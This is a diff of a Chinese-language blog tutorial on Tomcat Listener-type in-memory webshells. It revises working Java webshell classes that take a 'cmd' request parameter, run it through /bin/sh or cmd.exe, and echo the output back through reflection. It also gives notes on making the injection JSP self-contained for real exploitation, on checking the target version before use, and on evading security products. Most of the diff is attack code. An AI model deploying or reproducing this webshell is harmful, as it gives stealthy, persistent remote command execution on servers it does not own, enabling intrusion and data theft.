@@ -14,6 +14,8 @@ tags:
 
 Listener（监听器）型内存马利用 Tomcat 的事件监听机制，在特定事件（如请求到达、Session 创建）触发时执行恶意代码。相比 Filter 和 Servlet 型内存马，Listener 型具有更高的隐蔽性 —— 大多数安全产品不监控 Listener 的注册行为。
 
+**本质**：模拟 `addApplicationEventListener`，把恶意回调 + "请求到达事件"组装进监听器列表；请求到达时 `StandardHostValve` 派发 `requestInitialized` 事件，无需任何 URL 映射。整体框架见 [《内存马原理总纲》]({% post_url 2025-12-26-内存马原理总纲 %})。
+
 ---
 
 ## 一、Tomcat Listener 机制
@@ -115,9 +117,9 @@ import javax.servlet.ServletRequestEvent;
 import javax.servlet.ServletRequestListener;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
+import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 import java.lang.reflect.Field;
-import java.util.Scanner;
 
 /**
  * 基于 ServletRequestListener 的内存马
@@ -129,45 +131,30 @@ public class ListenerMemShell implements ServletRequestListener {
     public void requestInitialized(ServletRequestEvent sre) {
         ServletRequest servletRequest = sre.getServletRequest();
         HttpServletRequest request = (HttpServletRequest) servletRequest;
-        
+
         // 提取命令参数
         String cmd = request.getParameter("cmd");
         if (cmd != null && !cmd.isEmpty()) {
             try {
-                // 执行命令
-                Process process;
-                if (System.getProperty("os.name").toLowerCase().contains("windows")) {
-                    process = Runtime.getRuntime().exec(
-                        new String[]{"cmd.exe", "/c", cmd});
-                } else {
-                    process = Runtime.getRuntime().exec(
-                        new String[]{"/bin/sh", "-c", cmd});
-                }
+                String result = exec(cmd);
 
-                // 读取命令输出
-                InputStream inputStream = process.getInputStream();
-                Scanner scanner = new Scanner(
-                    inputStream, 
-                    System.getProperty("sun.jnu.encoding")
-                ).useDelimiter("\\A");
-                String result = scanner.hasNext() ? scanner.next() : "";
-
-                // 回显 —— 通过反射获取 Response 对象
-                // 注意：servletRequest 实际类型是 RequestFacade
+                // 回显 —— 通过两步反射获取 Response 对象（见 4.2 详解）
+                // 注意：servletRequest 实际类型是 RequestFacade，
                 // 需先获取内部 Request，再从中取 response 字段
                 Field reqField = servletRequest.getClass()
                     .getDeclaredField("request");
                 reqField.setAccessible(true);
                 Object innerRequest = reqField.get(servletRequest);
-                
+
                 Field responseField = innerRequest.getClass()
                     .getDeclaredField("response");
                 responseField.setAccessible(true);
                 HttpServletResponse response = (HttpServletResponse)
                     responseField.get(innerRequest);
 
-                response.getWriter().write("<pre>" + result + "</pre>");
-                scanner.close();
+                if (!response.isCommitted()) {
+                    response.getWriter().write("<pre>" + result + "</pre>");
+                }
             } catch (Exception ignored) {
                 // 静默处理，不影响正常业务
             }
@@ -178,6 +165,31 @@ public class ListenerMemShell implements ServletRequestListener {
     public void requestDestroyed(ServletRequestEvent sre) {
         // 无需操作
     }
+
+    /**
+     * 统一命令执行器（本系列 Filter / Servlet / Listener 三篇通用）
+     * - 通过 shell 执行，支持管道、重定向等语法（/bin/sh -c 或 cmd /c）
+     * - redirectErrorStream(true)：把 stderr 合并进 stdout，避免
+     *   "先读 stdout 再读 stderr" 顺序读取时管道写满导致的两端互相阻塞
+     * - 字节循环读取而非 Scanner，输出量大时不会阻塞
+     */
+    private static String exec(String cmd) throws Exception {
+        String[] execCmd = System.getProperty("os.name").toLowerCase().contains("windows")
+                ? new String[]{"cmd.exe", "/c", cmd}
+                : new String[]{"/bin/sh", "-c", cmd};
+
+        Process process = new ProcessBuilder(execCmd).redirectErrorStream(true).start();
+        try (ByteArrayOutputStream out = new ByteArrayOutputStream();
+             InputStream is = process.getInputStream()) {
+            byte[] buf = new byte[4096];
+            int len;
+            while ((len = is.read(buf)) != -1) {
+                out.write(buf, 0, len);
+            }
+            process.waitFor();
+            return out.toString(System.getProperty("sun.jnu.encoding"));
+        }
+    }
 }
 ```
 
@@ -186,9 +198,9 @@ public class ListenerMemShell implements ServletRequestListener {
 ```java
 import javax.servlet.*;
 import javax.servlet.http.*;
+import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 import java.lang.reflect.Field;
-import java.util.Scanner;
 
 /**
  * 同时实现多个监听器接口，增加触发路径
@@ -233,17 +245,14 @@ public class MultiListenerMemShell
     public void contextDestroyed(ServletContextEvent sce) {}
 
     /**
-     * 统一命令执行入口
+     * 统一命令执行入口（请求触发路径）
      */
     private void executeCommand(ServletRequest request) {
         String cmd = request.getParameter("cmd");
         if (cmd == null || cmd.isEmpty()) return;
 
         try {
-            Process process = Runtime.getRuntime().exec(cmd);
-            InputStream inputStream = process.getInputStream();
-            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
-            String result = scanner.hasNext() ? scanner.next() : "";
+            String result = exec(cmd);
 
             // 反射回显
             // 注意：request 实际类型是 RequestFacade，需先获取内部 Request
@@ -251,34 +260,57 @@ public class MultiListenerMemShell
                 .getDeclaredField("request");
             reqField.setAccessible(true);
             Object innerRequest = reqField.get(request);
-            
+
             Field responseField = innerRequest.getClass()
                 .getDeclaredField("response");
             responseField.setAccessible(true);
             HttpServletResponse response = (HttpServletResponse)
                 responseField.get(innerRequest);
-            
+
             // 确保响应未提交
             if (!response.isCommitted()) {
                 response.getWriter().write("<pre>" + result + "</pre>");
             }
-            scanner.close();
         } catch (Exception ignored) {
         }
     }
 
     /**
      * Session 场景的备用执行方法
+     * 注意：HttpSession 事件回调中拿不到当前请求的 Response 对象，无法直接回显，
+     * 这里把结果打印到服务端日志。若要回显，可把结果存入 Application/Session
+     * 属性，再由其他页面读取展示。
      */
     private void executeCommand(String cmd) {
         try {
-            Process process = Runtime.getRuntime().exec(cmd);
-            InputStream inputStream = process.getInputStream();
-            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
-            String result = scanner.hasNext() ? scanner.next() : "No output";
+            String result = exec(cmd);
             System.out.println("[ListenerShell] " + result);
-            scanner.close();
         } catch (Exception ignored) {
+        }
+    }
+
+    /**
+     * 统一命令执行器（本系列 Filter / Servlet / Listener 三篇通用）
+     * - 通过 shell 执行，支持管道、重定向等语法（/bin/sh -c 或 cmd /c）
+     * - redirectErrorStream(true)：把 stderr 合并进 stdout，避免
+     *   "先读 stdout 再读 stderr" 顺序读取时管道写满导致的两端互相阻塞
+     * - 字节循环读取而非 Scanner，输出量大时不会阻塞
+     */
+    private static String exec(String cmd) throws Exception {
+        String[] execCmd = System.getProperty("os.name").toLowerCase().contains("windows")
+                ? new String[]{"cmd.exe", "/c", cmd}
+                : new String[]{"/bin/sh", "-c", cmd};
+
+        Process process = new ProcessBuilder(execCmd).redirectErrorStream(true).start();
+        try (ByteArrayOutputStream out = new ByteArrayOutputStream();
+             InputStream is = process.getInputStream()) {
+            byte[] buf = new byte[4096];
+            int len;
+            while ((len = is.read(buf)) != -1) {
+                out.write(buf, 0, len);
+            }
+            process.waitFor();
+            return out.toString(System.getProperty("sun.jnu.encoding"));
         }
     }
 }
@@ -334,8 +366,10 @@ public class ListenerMemShellInjector {
 
 ### 3.4 触发注入的 JSP
 
+> 说明：以下 JSP 引用默认包类 `ListenerMemShell`，为**讲解简化**（假设恶意类已部署）。真实利用时 JSP 必须**自包含**——把恶意类内联进 `<%! %>` 并直接注册（写法见 [Valve 篇 3.4]({% post_url 2026-08-06-Tomcat_Valve内存马 %})），或由反序列化 `defineClass` 提供类；测试工程已提供自包含版本。
+
 ```jsp
-<%@ page import="org.apache.catalina.core.*" %>
+<%@ page import="org.apache.catalina.core.*, org.apache.catalina.connector.Request, java.lang.reflect.Field" %>
 <%
     try {
         // 获取 StandardContext
@@ -427,6 +461,21 @@ HTTP 请求到达
 ```
 
 Listener 在所有组件中**最先被调用**，这意味着即使 Filter 链中抛出异常或返回错误，Listener 的逻辑也已执行完毕。
+
+### 4.5 版本兼容性
+
+| Tomcat 版本 | Servlet 包 | 说明 |
+|-------------|-----------|------|
+| 8.x / 9.x | `javax.servlet` | 本系列代码适用 |
+| 10.x / 11.x | `jakarta.servlet` | 需全局替换包名 |
+
+- `addApplicationEventListener()` 是 `Context` 接口的 public 方法，无需反射，Tomcat 8/9/10/11
+  行为一致；10+ 仅需替换包名。
+- 两步反射回显依赖的字段 `RequestFacade.request`、`connector.Request.response` 在不同大版本间
+  相对稳定，但属于私有字段，字段名变更时回显会失败，实战前需确认目标版本。
+- 增强版原代码中 `Runtime.exec(cmd)` 单字符串版本不会经过 shell 解析，管道/参数无法生效，
+  已统一改为 `ProcessBuilder` + `/bin/sh -c`（或 `cmd /c`），并通过 `redirectErrorStream`
+  合并错误流，避免死锁。
 
 ---
 
@@ -604,4 +653,4 @@ Listener 内存马是三种 Tomcat 内存马中**隐蔽性最高**的一种：
 2. **Filter** — 最灵活，覆盖面最广
 3. **Servlet** — 备选通道，特定场景
 
-> **延伸阅读**：[Tomcat Filter 内存马](/2025/12/27/tomcat-filter-memory-shell/) | [Tomcat Servlet 内存马](/2025/12/27/tomcat-servlet-memory-shell/) | [Tomcat基础](/2025/12/30/tomcat-basics/)
+> **延伸阅读**：[Tomcat Filter 内存马]({% post_url 2025-12-27-Tomcat_filter内存马的 %}) | [Tomcat Servlet 内存马]({% post_url 2025-12-27-Tomcat_servlet内存马 %}) | [Tomcat Valve 内存马]({% post_url 2026-08-06-Tomcat_Valve内存马 %}) | [Java Agent 内存马]({% post_url 2026-08-06-Java_Agent内存马 %}) | [Spring 容器内存马]({% post_url 2026-08-06-Spring_容器内存马 %}) | [WebSocket 等偏门内存马]({% post_url 2026-08-06-Tomcat_WebSocket等偏门内存马 %}) | [Tomcat基础]({% post_url 2025-12-30-Tomcat基础 %})
